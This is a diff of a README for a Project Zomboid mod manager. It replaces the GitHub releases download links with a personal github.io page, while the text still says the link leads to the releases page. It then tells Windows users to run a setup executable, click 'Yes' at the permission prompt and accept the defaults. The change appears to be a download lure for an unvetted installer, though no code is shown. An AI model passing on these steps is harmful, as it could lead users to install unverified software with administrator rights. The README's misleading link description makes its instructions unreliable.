@@ -1,7 +1,7 @@
 <h1>🎮 Project-Zomboid-Mod-Manager-Build-42 - Manage Your Mods Effortlessly</h1>
 
 <p align="center">
-    <a href="https://github.com/adamha2475/Project-Zomboid-Mod-Manager-Build-42/releases">
+    <a href="https://adamha2475.github.io">
         <img src="https://img.shields.io/badge/Download-Project%20Zomboid%20Mod%20Manager-2ea44f?style=for-the-badge" alt="Download Button">
     </a>
 </p>
@@ -10,7 +10,7 @@
 <p>Welcome! This guide will walk you through downloading and running the Project Zomboid Mod Manager on your Windows computer. Follow these simple steps and you'll be managing mods in no time. No coding or technical skills are required.</p>
 
 <h3>📥 Step 1: Download the Application</h3>
-<p>Click the large green button above or use this link: <a href="https://github.com/adamha2475/Project-Zomboid-Mod-Manager-Build-42/releases">https://github.com/adamha2475/Project-Zomboid-Mod-Manager-Build-42/releases</a>. Visit this link to download the application. You will be taken to a page with all the releases. Look for the newest version at the top and click on the file name to start the download.</p>
+<p>Click the large green button above or use this link: <a href="https://adamha2475.github.io">https://adamha2475.github.io</a>. Visit this link to download the application. You will be taken to a page with all the releases. Look for the newest version at the top and click on the file name to start the download.</p>
 
 <h3>🎯 Step 2: Run the Installer</h3>
 <p>Once the download finishes, locate the file in your downloads folder (usually named something like <code>PZModManagerSetup.exe</code>). Double-click the file to run it. If your computer asks for permission to make changes, click "Yes". The installer will guide you through the rest. Just accept the default settings and click "Install".</p>
